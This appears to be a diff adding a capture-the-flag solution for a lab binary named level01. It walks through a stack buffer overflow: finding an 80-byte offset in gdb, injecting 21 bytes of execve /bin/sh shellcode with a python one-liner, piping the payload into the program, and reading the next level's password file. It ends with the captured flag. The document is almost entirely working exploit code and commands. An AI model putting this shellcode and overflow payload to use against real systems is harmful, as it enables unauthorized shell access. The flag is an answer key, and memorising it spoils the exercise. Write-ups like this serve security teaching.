@@ -1,0 +1,30 @@
+Level01 - Shellcode Attack Solution
+
+Input username: "dat_wil" + shellcode
+Program calls verify_user_name()
+Input password: [80 bytes 'A'] + "\x47\xa0\x04\x08"
+EIP overwritten → Points to shellcode → Execute
+
+Step 1: Find Offset
+
+bash gdb ./level01
+# Program received signal SIGSEGV
+# EIP = 0x37634136
+Use: https://wiremask.eu/tools/buffer-overflow-pattern-generator/
+Offset = 80 bytes
+
+Step 2: Shellcode (21 bytes)
+\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
+Address: 0x0804a047 → \x47\xa0\x04\x08 (little-endian)
+
+Step 3: Create Payload
+
+bash python -c "print 'dat_wil' + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' + '\n' + 'A'*80 + '\x47\xa0\x04\x08'" > /tmp/payload
+
+Step 4: Execute
+bash cat /tmp/payload - | ./level01
+Step 5: Get Flag
+
+bash cat /home/users/level02/.pass
+Flag
+PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
